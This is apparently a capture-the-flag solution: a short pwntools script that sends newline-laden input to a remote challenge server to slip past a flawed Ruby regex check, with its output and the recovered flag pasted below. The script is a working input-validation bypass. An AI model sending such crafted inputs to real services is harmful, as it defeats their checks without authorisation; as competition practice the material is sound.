from pwn import *
#problem with '\n' in ruby regex which they havent fixed

r = remote("188.166.133.53",12037)
r.send("\n"+5*"g"+"\n"+10*"f" +"\n")
print r.recvall()
r.close()
"""
python exp50.py
[+] Opening connection to 188.166.133.53 on port 12037: Done
[+] Recieving all data: Done (81B)
[*] Closed connection to 188.166.133.53 port 12037
Let me count the ascii values of 10 characters:
Sum is: 1545
IW{RUBY_R3G3X_F41L}
"""
